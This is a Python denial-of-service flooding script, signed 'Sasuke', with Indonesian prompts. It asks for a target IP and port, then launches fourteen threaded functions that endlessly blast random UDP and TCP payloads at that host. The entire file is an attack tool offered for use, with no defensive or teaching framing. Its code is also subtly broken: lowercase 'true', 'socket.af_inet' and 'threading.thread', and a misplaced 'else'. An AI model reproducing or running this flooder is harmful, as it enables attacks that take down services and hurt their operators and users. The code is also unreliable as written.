import random
import socket
import threading
import os,sys

os.system("clear")
print("code by Sasuke")
print("Gass Abuse")
ip = str(input("ip target:"))
port = int(input("port target:"))
choice = str(input("gas nih bre?(y/n):"))
times = int(input("packet:"))
threads = int(input("threads:"))
os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_dgram)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            print("Sasuke Susano")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")

def run4():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_dgram)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            print("Sasuke Susano")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")

def run8():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_dgram)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            print("Sasuke Susano")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")

def run12():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")

def run14():
    data = random._urandom(16)
    i = random.choice(("go ","go ","go "))
    while true:
        try:
            s = socket.socket(socket.af_inet, socket.sock_stream)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Sasuke Susano menyenggol ip %s dan port %s"%(ip, port))
        except:
            s.close()
            print("Sasuke Susano")
for y in range(threads):
    if choice == 'y':
        th = threading.thread(target = run)
        th.start()
        th = threading.thread(target = run2)
        th.start()
        th = threading.thread(target = run3)
        th.start()
        th = threading.thread(target = run4)
        th.start()
        th = threading.thread(target = run5)
        th.start()
        th = threading.thread(target = run6)
        th.start()
        th = threading.thread(target = run7)
        th.start()
        th = threading.thread(target = run8)
        th.start()
        th = threading.thread(target = run9)
        th.start()
        th = threading.thread(target = run10)
        th.start()
        th = threading.thread(target = run11)
        th.start()
        th = threading.thread(target = run12)
        th.start()
        th = threading.thread(target = run13)
        th.start()
else:
        th = threading.thread(target = run14)
        th.start()